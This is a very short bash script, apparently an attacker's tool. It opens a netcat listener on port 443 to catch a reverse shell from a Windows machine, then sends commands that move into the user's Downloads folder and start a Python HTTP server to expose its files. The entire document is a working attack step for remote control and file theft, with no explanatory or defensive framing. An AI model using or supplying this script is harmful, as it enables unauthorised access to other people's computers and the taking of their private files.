#!/bin/bash

rlwrap nc -nlvp 443 << EOF 

cd c:\users\user\downloads
python -m http.server
 
EOF
